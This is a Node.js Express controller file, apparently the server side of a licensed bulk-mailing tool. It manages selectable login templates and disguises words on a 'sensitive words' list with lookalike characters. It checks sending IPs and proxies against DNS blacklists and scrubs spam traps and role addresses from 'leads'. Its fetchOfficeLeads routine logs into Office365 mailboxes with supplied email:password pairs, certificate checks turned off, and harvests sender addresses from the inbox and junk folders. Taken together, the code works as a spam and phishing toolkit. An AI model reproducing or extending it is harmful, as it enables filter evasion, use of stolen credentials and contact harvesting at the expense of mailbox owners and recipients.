const HttpError = require("../models/http-error");
const { validationResult } = require("express-validator");
const user = require("../models/user");
const { default: mongoose } = require("mongoose");
const generalSetting = require("../models/general-setting");
const loginTemplate = require("../models/login-template");
const ENGINE = require("../shared/engine");
const dns = require("dns");
const net = require("net");
const dnsbl = require("dnsbl");
const BSON = require("bson");
const parsePhoneNumber = require("libphonenumber-js");
const lookup = require("country-code-lookup");
var { MailListener } = require("mail-listener5");
const legit = require("legit");
const esc = require("email-syntax-check");
const { geocoder, carrier } = require("libphonenumber-geo-carrier");
var CompanyEmailValidator = require("company-email-validator");

const calculateElapsedDay = (regDate) => {
  const elapsedMiliseconds = new Date() - new Date(regDate);
  const runningDays = Math.ceil(elapsedMiliseconds / (1000 * 60 * 60 * 24));

  return runningDays;
};

const saveGeneralSettings = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid Settings Data.", 422));
  }

  const { timezone, pwdExtrakey, phoneKey } = req.body;
  const userData = await user.find().exec();
  if (userData.length === 0) {
    return next(new HttpError("User data error", 500));
  }

  const generalSettingTable = await generalSetting.find().exec();

  try {
    const sess = await mongoose.startSession();
    sess.startTransaction();

    if (generalSettingTable.length > 0) {
      userData[0].key = pwdExtrakey;
      await userData[0].save({ session: sess });

      await generalSetting.remove({}).exec();
      const settings = new generalSetting({
        timezone: timezone,
        phoneKey: phoneKey,
      });

      await settings.save({ session: sess });
      await sess.commitTransaction();
    }

    if (generalSettingTable.length === 0) {
      const settings = new generalSetting({
        timezone: timezone,
        phoneKey: phoneKey,
      });

      userData[0].key = pwdExtrakey;
      await userData[0].save({ session: sess });

      await settings.save({ session: sess });
      await sess.commitTransaction();
    }
  } catch (error) {
    return next(new HttpError("Error editting general settings", 500));
  }

  res.status(201).json({ message: "Save setting sucessfully" });
};

const loadInitialData = async (req, res, next) => {
  const userData = await user.find().exec();
  if (userData.length === 0) {
    return next(new HttpError("User data error", 500));
  }

  let runningDays;
  try {
    runningDays = calculateElapsedDay(userData[0]?.added);
  } catch (error) {
    return next(new HttpError("User data error", 500));
  }

  try {
    const settings = await generalSetting.find().exec();
    const pwdExtraKey = userData[0].key;

    const data = {
      running: runningDays + " day(s)",
      timezone: settings[0]?.timezone,
      pwdExtraKey: pwdExtraKey,
      phoneKey: settings[0]?.phoneKey,
    };

    res.status(201).json(data);
  } catch (error) {
    return next(new HttpError("Error loading settings data", 500));
  }
};

const createTemplate = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid template", 422));
  }

  const { url } = req.body;
  let timeZone;
  let templates;
  try {
    templates = await loginTemplate.find().exec();
    if (templates.length > 5) {
      return next(new HttpError("Maximum 5 templates", 500));
    }

    const settings = await generalSetting.find().exec();
    timeZone = settings[0]?.timezone;
  } catch (error) {
    return next(new HttpError("Adding template failed. Please try again", 500));
  }

  const template = new loginTemplate({
    url: url,
    isSelected: false,
    added: new Date(Date.now()).toLocaleString("en-US", { timeZone: timeZone }) || new Date(Date.now()).toLocaleString(),
  });

  try {
    await template.save();
    res.status(201).json({ template });
  } catch (error) {
    return next(new HttpError("Adding new template failed. Please try again", 500));
  }
};

const saveTemplate = async (req, res, next) => {
  const { id } = req.body;

  let template;
  let prevSelecteds;
  try {
    prevSelecteds = await loginTemplate.find({ isSelected: true }).exec();

    prevSelecteds.forEach((element) => {
      element.isSelected = false;
      element.save();
    });

    template = await loginTemplate.findById(id);

    template.isSelected = true;
    await template.save();
    res.status(202).json({ message: "Save sucessfully" });
  } catch (error) {
    return next(new HttpError("Save template failed. Please try again", 500));
  }
};

const fetchTemplates = async (req, res, next) => {
  let templates;
  try {
    const tempTemplates = await loginTemplate.find().sort({ added: "desc" }).exec();

    const templates = tempTemplates.map((x) => x.toObject({ getters: true }));
    res.status(200).json({ templates });
  } catch (error) {
    return next(new HttpError(`Loading templates failed`, 500));
  }
};

const getSelectedTemplate = async (req, res, next) => {
  let selectedTemplate;
  try {
    selectedTemplate = await loginTemplate.find({ isSelected: true }).exec();
    res.status(200).json({ selectedTemplate: selectedTemplate[0] });
  } catch (error) {
    return next(new HttpError("Get template data failed. Please try again", 500));
  }
};

const previewTemplate = async (req, res, next) => {
  const { id: id } = req.params;
  let selectedTemplate;
  try {
    selectedTemplate = await loginTemplate.findById(id).exec();
    res.status(200).json({ selectedTemplate: selectedTemplate.toObject({ getters: true }) });
  } catch (error) {
    return next(new HttpError("Get template data failed. Please try again", 500));
  }
};

const removeTemplates = async (req, res, next) => {
  const { templateId } = req.params;

  try {
    await loginTemplate.findByIdAndRemove(templateId);
    res.status(202).json();
  } catch (error) {
    return next(new HttpError("Delete failed. Please try again", 500));
  }
};

const processTextToArray = (text) => {
  const arrayLetters = text
    .trim()
    .replaceAll("\n", " ")
    .replaceAll("\t", " ")
    .replaceAll("\r", " ")
    .replaceAll(",", " ")
    .replaceAll(".", " ")
    .replaceAll("!", " ")
    .replaceAll("&", " ")
    .replaceAll("-", " ")
    .replaceAll(":", " ")
    .replaceAll(";", " ")
    .replaceAll("?", " ")
    .replaceAll(")", " ")
    .replaceAll("(", " ")
    .replaceAll("[", " ")
    .replaceAll("]", " ")
    .replaceAll("{", " ")
    .replaceAll("}", " ")
    .replaceAll("#", " ")
    .replaceAll("@", " ")
    .replaceAll("_", " ")
    .replaceAll("=", " ")
    .replaceAll("|", " ")
    .replaceAll("/", " ")
    .replaceAll(">", " ")
    .replaceAll("<", " ")
    .replaceAll('"', " ")
    .replaceAll("'", " ")
    .replaceAll("~", " ")
    .replaceAll("+", " ")
    .split(" ")
    .filter((x) => x)
    .filter((y) => y.length > 1)
    .filter((y) => y.toLowerCase() !== "style")
    .filter((y) => y.toLowerCase() !== "title")
    .filter((y) => y.toLowerCase() !== "height")
    .filter((y) => y.toLowerCase() !== "auto")
    .filter((y) => y.toLowerCase() !== "meta")
    .filter((y) => y.toLowerCase() !== "img")
    .filter((y) => y.toLowerCase() !== "center")
    .filter((y) => y.toLowerCase() !== "left")
    .filter((y) => y.toLowerCase() !== "right")
    .filter((y) => y.toLowerCase() !== "margin")
    .filter((y) => y.toLowerCase() !== "color")
    .filter((y) => y.toLowerCase() !== "padding")
    .filter((y) => y.toLowerCase() !== "span")
    .filter((y) => y.toLowerCase() !== "width");

  return arrayLetters;
};

const regex =
  /([\u0041-\u005A\u0061-\u007A\u00AA\u00B5\u00BA\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0370-\u0374\u0376\u0377\u037A-\u037D\u0386\u0388-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u048A-\u0527\u0531-\u0556\u0559\u0561-\u0587\u05D0-\u05EA\u05F0-\u05F2\u0620-\u064A\u066E\u066F\u0671-\u06D3\u06D5\u06E5\u06E6\u06EE\u06EF\u06FA-\u06FC\u06FF\u0710\u0712-\u072F\u074D-\u07A5\u07B1\u07CA-\u07EA\u07F4\u07F5\u07FA\u0800-\u0815\u081A\u0824\u0828\u0840-\u0858\u08A0\u08A2-\u08AC\u0904-\u0939\u093D\u0950\u0958-\u0961\u0971-\u0977\u0979-\u097F\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BD\u09CE\u09DC\u09DD\u09DF-\u09E1\u09F0\u09F1\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A59-\u0A5C\u0A5E\u0A72-\u0A74\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABD\u0AD0\u0AE0\u0AE1\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3D\u0B5C\u0B5D\u0B5F-\u0B61\u0B71\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BD0\u0C05-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C33\u0C35-\u0C39\u0C3D\u0C58\u0C59\u0C60\u0C61\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBD\u0CDE\u0CE0\u0CE1\u0CF1\u0CF2\u0D05-\u0D0C\u0D0E-\u0D10\u0D12-\u0D3A\u0D3D\u0D4E\u0D60\u0D61\u0D7A-\u0D7F\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0E01-\u0E30\u0E32\u0E33\u0E40-\u0E46\u0E81\u0E82\u0E84\u0E87\u0E88\u0E8A\u0E8D\u0E94-\u0E97\u0E99-\u0E9F\u0EA1-\u0EA3\u0EA5\u0EA7\u0EAA\u0EAB\u0EAD-\u0EB0\u0EB2\u0EB3\u0EBD\u0EC0-\u0EC4\u0EC6\u0EDC-\u0EDF\u0F00\u0F40-\u0F47\u0F49-\u0F6C\u0F88-\u0F8C\u1000-\u102A\u103F\u1050-\u1055\u105A-\u105D\u1061\u1065\u1066\u106E-\u1070\u1075-\u1081\u108E\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u1380-\u138F\u13A0-\u13F4\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u1700-\u170C\u170E-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176C\u176E-\u1770\u1780-\u17B3\u17D7\u17DC\u1820-\u1877\u1880-\u18A8\u18AA\u18B0-\u18F5\u1900-\u191C\u1950-\u196D\u1970-\u1974\u1980-\u19AB\u19C1-\u19C7\u1A00-\u1A16\u1A20-\u1A54\u1AA7\u1B05-\u1B33\u1B45-\u1B4B\u1B83-\u1BA0\u1BAE\u1BAF\u1BBA-\u1BE5\u1C00-\u1C23\u1C4D-\u1C4F\u1C5A-\u1C7D\u1CE9-\u1CEC\u1CEE-\u1CF1\u1CF5\u1CF6\u1D00-\u1DBF\u1E00-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u2071\u207F\u2090-\u209C\u2102\u2107\u210A-\u2113\u2115\u2119-\u211D\u2124\u2126\u2128\u212A-\u212D\u212F-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2183\u2184\u2C00-\u2C2E\u2C30-\u2C5E\u2C60-\u2CE4\u2CEB-\u2CEE\u2CF2\u2CF3\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D80-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u2E2F\u3005\u3006\u3031-\u3035\u303B\u303C\u3041-\u3096\u309D-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312D\u3131-\u318E\u31A0-\u31BA\u31F0-\u31FF\u3400-\u4DB5\u4E00-\u9FCC\uA000-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA61F\uA62A\uA62B\uA640-\uA66E\uA67F-\uA697\uA6A0-\uA6E5\uA717-\uA71F\uA722-\uA788\uA78B-\uA78E\uA790-\uA793\uA7A0-\uA7AA\uA7F8-\uA801\uA803-\uA805\uA807-\uA80A\uA80C-\uA822\uA840-\uA873\uA882-\uA8B3\uA8F2-\uA8F7\uA8FB\uA90A-\uA925\uA930-\uA946\uA960-\uA97C\uA984-\uA9B2\uA9CF\uAA00-\uAA28\uAA40-\uAA42\uAA44-\uAA4B\uAA60-\uAA76\uAA7A\uAA80-\uAAAF\uAAB1\uAAB5\uAAB6\uAAB9-\uAABD\uAAC0\uAAC2\uAADB-\uAADD\uAAE0-\uAAEA\uAAF2-\uAAF4\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uABC0-\uABE2\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D\uFB1F-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE70-\uFE74\uFE76-\uFEFC\uFF21-\uFF3A\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]+)/g;

const encryptLetter = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid letter", 422));
  }

  // const { words } = req.body;
  const { words, email, pcId, productId } = req.body;

  let existingUser;
  try {
    existingUser = await user.findOne({ email: email });
  } catch (error) {
    return next(new HttpError(error, 422));
  }

  if (!existingUser) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.pcId !== pcId) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.productId !== productId) {
    return next(new HttpError("Invalid account, please try again", 500));
  }

  let convertedList = [];

  let arrayLetters = words.match(regex).filter((x) => [...x].length > 1);
  try {
    const letterLibs = ENGINE.encryptedLetterLibrary;
    arrayLetters.forEach((word) => {
      let val = "";
      [...word].forEach((letter) => {
        const child = letterLibs.find((x) => x.key === letter);
        if (child) {
          val += replaceAll(letter, child.key, child.value);
        }
      });
      convertedList.push({ key: word, value: val });
    });
  } catch (error) {
    return next(new HttpError(error.message, 422));
  }

  res.status(202).json({ wordEncrypted: convertedList });
};

function replaceAll(str, match, replacement) {
  return str.split(match).join(replacement);
}

const encryptSensitiveWords = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid letter", 422));
  }

  const { words } = req.body;
  let matchedWords = [];

  let convertedList = [];
  try {
    const letterLibs = ENGINE.encryptedLetterLibrary;
    const sensitiveWordLibs = ENGINE.sensitiveWordsLib;

    sensitiveWordLibs.forEach((element) => {
      const found = words.search(element);
      const found2 = words.search(/element/i);
      if (found !== -1) {
        matchedWords.push(element);
      }
      if (found2 !== -1) {
        matchedWords.push(/element/i);
      }
    });

    matchedWords.forEach((word) => {
      let val = "";
      [...word].forEach((letter) => {
        const child = letterLibs.find((x) => x.key === letter);
        if (child) {
          val += replaceAll(letter, child.key, child.value);
        }
      });
      convertedList.push({ key: word, value: val });
    });
  } catch (error) {
    return next(new HttpError(error.message, 422));
  }

  res.status(202).json({ wordEncrypted: convertedList });
};

const convertDomainToIpAddress = async (domain) => {
  return new Promise((resolve, reject) => {
    dns.lookup(domain, (err, address, family) => {
      if (err) reject(err);
      resolve(address);
    });
  });
};

const checkEmailsBlacklist = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid emails", 422));
  }

  const { emails } = req.body;
  let ipList = [];
  let ipAndEmails = [];
  let whitelistMails = [];

  for (let index = 0; index < emails.length; index++) {
    const email = emails[index].trim();
    const split = email.split("@");
    if (split.length !== 2) continue;
    let address;
    try {
      address = await convertDomainToIpAddress(split[1]);
      ipList.push(address);
      ipAndEmails.push({ ip: address, email: email });
    } catch (err) {
      console.error(err);
      continue;
    }
  }

  if (ipList.length === 0) {
    return next(new HttpError("Invalid email address", 500));
  }

  const promiseArr = [dnsbl.batch(ipList, ENGINE.blockLists)];
  let results;
  let sitesGotReported = [];
  let finalResults = [];
  try {
    results = await Promise.all(promiseArr);
    for (let index = 0; index < ipAndEmails.length; index++) {
      sitesGotReported = [];
      const element = ipAndEmails[index];
      const itemArr = results[0].filter((x) => x.address === element.ip);

      const listedCount = itemArr.filter((x) => x.listed).length; // if ip has 0 listed continue;
      if (listedCount === 0) {
        whitelistMails.push(element.email);
      }

      if (listedCount > 0) {
        itemArr.forEach((item) => {
          if (item.listed) {
            sitesGotReported.push(item.blacklist);
          }
        });
      }

      const itemData = {
        totalBlSites: ENGINE.blockLists.length,
        reportedCount: sitesGotReported.length,
        reportedSites: sitesGotReported,
        email: element.email,
      };

      finalResults.push(itemData);
    }
  } catch (e) {
    console.log(e);
  }

  res.status(202).json({ blResults: finalResults, whiteLists: whitelistMails });
};

const getPhoneInfo = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid emails", 422));
  }

  const { numbers, email, pcId, productId } = req.body;

  let existingUser;
  try {
    existingUser = await user.findOne({ email: email });
  } catch (error) {
    return next(new HttpError(error, 422));
  }

  if (!existingUser) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.pcId !== pcId) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.productId !== productId) {
    return next(new HttpError("Invalid account, please try again", 500));
  }

  const resultArr = [];
  let numberArr = [];
  numbers.forEach((x) => numberArr.push({ originalNumber: x.Number, rowIndex: x.RowIndex }));
  for (let index = 0; index < numberArr.length; index++) {
    let number = numberArr[index].originalNumber;

    if (!number.includes("+")) {
      number = "+" + numberArr[index].originalNumber;
    }

    let phoneData;
    try {
      const phoneNumber = parsePhoneNumber(number);

      const type = phoneNumber.getType();
      const location = await geocoder(phoneNumber);

      const carrierName = await carrier(phoneNumber);
      const countryData = lookup.byIso(phoneNumber.country);

      phoneData = {
        rowIndex: numberArr[index].rowIndex,
        countryCode: phoneNumber.country,
        country: phoneNumber.country ?? countryData.country,
        diallingCode: phoneNumber.countryCallingCode,
        type: type,
        local: phoneNumber.formatNational(),
        format: phoneNumber.nationalNumber,
        international: phoneNumber.formatInternational(),
        carrier: carrierName,
        continent: countryData.continent,
        region: countryData.region,
        country: countryData.country,
        city: location,
        capital: countryData.capital,
        isValid: true,
      };
      resultArr.push(phoneData);
    } catch (error) {
      phoneData = {
        isValid: false,
        local: numberArr[index].originalNumber,
      };
      resultArr.push(phoneData);
      continue;
    }
  }

  try {
    // res.status(202).json({ phoneDatas: numberArr });
    res.status(202).json(resultArr);
  } catch (error) {}
};

const checkIpsBlacklist = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid proxy list", 422));
  }

  const { ips, email, pcId, productId } = req.body;

  let existingUser;
  try {
    existingUser = await user.findOne({ email: email });
  } catch (error) {
    return next(new HttpError(error, 422));
  }

  if (!existingUser) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.pcId !== pcId) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.productId !== productId) {
    return next(new HttpError("Invalid account, please try again", 500));
  }

  let ipList = [];
  let whitelistIps = [];

  for (let index = 0; index < ips.length; index++) {
    const element = ips[index];
    var r = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/;
    var t = element.match(r);

    const isValidIp = net.isIPv4(t[0]);

    if (!isValidIp) continue;
    ipList.push(t[0]);
  }

  const promiseArr = [dnsbl.batch(ipList, ENGINE.blockLists)];
  let results;
  let finalResults = [];

  try {
    results = await Promise.all(promiseArr);

    for (let index = 0; index < ipList.length; index++) {
      let sitesGotReported = [];
      sitesGotReported = [];
      const element = ipList[index];

      const ipFound = results[0].filter((x) => x.address === element && x.listed);
      if (ipFound.length === 0) {
        const itemData = {
          reportedCount: 0,
          ip: element,
        };

        finalResults.push(itemData);

        const originalIp = ips.find((x) => x.includes(element));
        if (originalIp) {
          whitelistIps.push(originalIp);
        }
        continue;
      }

      ipFound.forEach((item) => {
        if (item.listed) {
          sitesGotReported.push(item.blacklist);
        }
      });

      const itemData = {
        reportedCount: sitesGotReported.length,
        ip: element,
        blServers: sitesGotReported,
      };

      finalResults.push(itemData);
    }
  } catch (e) {
    console.log(e);
  }

  res.status(202).json({ blResults: finalResults, whiteLists: whitelistIps });
};

const handlerMailBox = async (user, pass, host, box) => {
  return new Promise((resolve, reject) => {
    try {
      let resArr = [];
      let totalMails = 0;
      let count = 0;
      let finalResult = {};
      var mailListener = new MailListener({
        username: user,
        password: pass,
        host: host || "outlook.office365.com",
        port: 993, // imap port
        tls: true,
        connTimeout: 10000, // Default by node-imap
        authTimeout: 5000, // Default by node-imap,
        debug: null, // Or your custom function with only one incoming argument. Default: null //console.log
        autotls: "never", // default by node-imap
        tlsOptions: { rejectUnauthorized: false },
        mailbox: box, // mailbox to monitor
        searchFilter: ["ALL"], // the search filter being used after an IDLE notification has been retrieved
        markSeen: true, // all fetched email willbe marked as seen and not fetched next time
        fetchUnreadOnStart: true, // use it only if you want to get all unread email on lib start. Default is `false`,
        attachments: false, // download attachments as they are encountered to the project directory
        attachmentOptions: { directory: "attachments/" }, // specify a download directory for attachments
      });

      mailListener.start();
      mailListener.on("server:connected", function () {
        console.log("imapConnected");
      });

      mailListener.on("mailbox", function (mailbox) {
        console.log("Total number of mails: ", mailbox.messages.total); // this field in mailbox gives the total number of emails
        totalMails = +mailbox.messages.total;
      });

      mailListener.on("server:disconnected", function () {
        console.log("imapDisconnected");
      });

      mailListener.on("error", function (err) {
        reject(err);
      });

      mailListener.on("mail", function (mail, seqno) {
        // const r = /([a-zA-Z0-9+._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/;
        // const r = /([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
        // const from = mail.from.text.match(r)[0];
        // const to = mail.to.text.match(r);

        // resArr.push(from, ...to);

        const from = mail.from.text;
        // const to = mail.to.text;

        resArr.push(from);
        // resArr.push(to);
        count++;
        if (count === totalMails) {
          mailListener.stop();
          finalResult = { totalMails: totalMails, mails: [...resArr] };
          resolve(finalResult);
        }
      });
    } catch (error) {
      reject(error);
    }
  });
};

const fetchOfficeLeads = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid proxy list", 422));
  }

  const { email, productId, pcId, mails, delimiter } = req.body;

  let existingUser;
  try {
    existingUser = await user.findOne({ email: email });
  } catch (error) {
    return next(new HttpError(error, 422));
  }

  if (!existingUser) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.pcId !== pcId) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.productId !== productId) {
    return next(new HttpError("Invalid account, please try again", 500));
  }

  let results = [];
  let validOfficeAccounts;
  let totalMailAccess = 0;
  const mailInfoArr = mails.split(delimiter);
  const userEmail = mailInfoArr[0];
  const passEmail = mailInfoArr[1];
  try {
    const promiseArr = await handlerMailBox(userEmail, passEmail, "outlook.office365.com", "INBOX");
    const promiseArr1 = await handlerMailBox(userEmail, passEmail, "outlook.office365.com", "JUNK");
    let response;
    let response1;

    response = await Promise.resolve(promiseArr);
    response1 = await Promise.resolve(promiseArr1);
    results.push(...response.mails, ...response1.mails);
    // results.push(response.totalMails + , ...response1);

    // results = results.filter(function (item, pos) {
    //   return results.indexOf(item) === pos;
    // });

    totalMailAccess = response.totalMails + response1.totalMails;

    validOfficeAccounts = userEmail;
  } catch (error) {
    console.log(error);
  }

  res.status(202).json({ mailList: results, validAccounts: validOfficeAccounts, numberMailsAccess: totalMailAccess });
};

const RemoveSpamMails = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid mail list", 422));
  }

  const { email, productId, pcId, mails } = req.body;

  let existingUser;
  try {
    existingUser = await user.findOne({ email: email });
  } catch (error) {
    return next(new HttpError(error, 422));
  }

  if (!existingUser) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.pcId !== pcId) {
    return next(new HttpError("Login failed. Please try again", 403));
  }

  if (existingUser.productId !== productId) {
    return next(new HttpError("Invalid account, please try again", 500));
  }

  let validLeads = [];
  let disposableArr = [];
  let noreplyArr = [];
  let spamTrapArr = [];
  let invalidArr = [];

  for (let index = 0; index < mails.length; index++) {
    const mail = mails[index].trim();
    try {
      const legitMail = await legit(mail);

      if (!legitMail.isValid) {
        invalidArr.push(mail);
        continue;
      }
      const response = await esc.syntaxCheck(mail);
      switch (response.status) {
        case ENGINE.DEAD_MAIL_STATUS.DISPOSABLE:
          disposableArr.push(mail);
          break;
        case ENGINE.DEAD_MAIL_STATUS.FREE_MAIL:
          validLeads.push(mail);
          break;
        case ENGINE.DEAD_MAIL_STATUS.INVALID:
          if (legitMail.isValid) {
            validLeads.push(mail);
          } else {
            invalidArr.push(mail);
          }
          break;
        case ENGINE.DEAD_MAIL_STATUS.OFFICIAL:
          validLeads.push(mail);
          break;
        case ENGINE.DEAD_MAIL_STATUS.ROLES:
          noreplyArr.push(mail);
          break;
        case ENGINE.DEAD_MAIL_STATUS.SPAM_TRAP:
          spamTrapArr.push(mail);
          break;
        default:
          break;
      }
    } catch (error) {
      invalidArr.push(mail);
      continue;
    }
  }

  res.status(202).json({ validMails: validLeads, invalids: { noReply: noreplyArr, spam: spamTrapArr, invalid: invalidArr, disposable: disposableArr } });
};

const CompanyEmailFilter = async (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return next(new HttpError("Invalid mail list", 422));
  }

  const { mails } = req.body;
  let companyLeadsArr = [];
  for (let index = 0; index < mails.length; index++) {
    const mail = mails[index];
    try {
      var isCompanyEmail = CompanyEmailValidator.isCompanyEmail(mail); // true
      if (isCompanyEmail) {
        companyLeadsArr.push(mail);
      }
    } catch (error) {
      continue;
    }
  }

  res.status(202).json({ companyLeads: companyLeadsArr });
};

exports.loadInitialData = loadInitialData;
exports.saveGeneralSettings = saveGeneralSettings;
exports.createTemplate = createTemplate;
exports.saveTemplate = saveTemplate;
exports.fetchTemplates = fetchTemplates;
exports.getSelectedTemplate = getSelectedTemplate;
exports.previewTemplate = previewTemplate;
exports.removeTemplates = removeTemplates;
exports.encryptAll = encryptLetter;
exports.encryptSensitiveWords = encryptSensitiveWords;
exports.checkEmailsBlacklist = checkEmailsBlacklist;
exports.getPhoneInfo = getPhoneInfo;
exports.checkIpsBlacklist = checkIpsBlacklist;
exports.fetchOfficeLeads = fetchOfficeLeads;
exports.RemoveSpamMails = RemoveSpamMails;
exports.CompanyEmailFilter = CompanyEmailFilter;
